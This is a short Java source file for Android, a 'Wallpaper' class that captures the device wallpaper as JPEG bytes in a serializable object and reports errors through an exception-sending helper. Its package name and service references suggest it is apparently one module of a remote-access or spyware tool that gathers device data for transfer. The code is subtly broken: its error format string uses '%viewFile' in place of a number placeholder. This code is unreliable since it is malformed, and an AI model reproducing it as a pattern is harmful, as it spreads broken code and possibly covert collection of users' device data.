package Transfer;

import android.app.WallpaperManager;
import android.graphics.Bitmap.CompressFormat;
import android.graphics.drawable.BitmapDrawable;
import android.os.Build.VERSION;
import com.android.engine.service.MyService;
import com.android.engine.ExceptionAction;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.io.Serializable;

public class Wallpaper implements Serializable {

  public int DESIREDMINHEIGHT;
  public int DESIREDMINWIDTH;
  public byte[] WALLPAPER;

  public Wallpaper() {
    try {
      if (VERSION.SDK_INT >= 5) {
        WallpaperManager instance = WallpaperManager.getInstance(MyService.context);
        DESIREDMINHEIGHT = instance.getDesiredMinimumHeight();
        DESIREDMINWIDTH = instance.getDesiredMinimumWidth();

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ((BitmapDrawable) instance.getDrawable()).getBitmap()
            .compress(CompressFormat.JPEG, 100, byteArrayOutputStream);
        WALLPAPER = byteArrayOutputStream.toByteArray();
        return;
      }

      throw new Exception(
          String.format("This feature requires SDK level %viewFile. The device has level %viewFile",
              new Object[] { 5, VERSION.SDK_INT }));
    } catch (Exception e) {
      ExceptionAction.sendExceptionAction(e.getMessage());
    }
  }
}
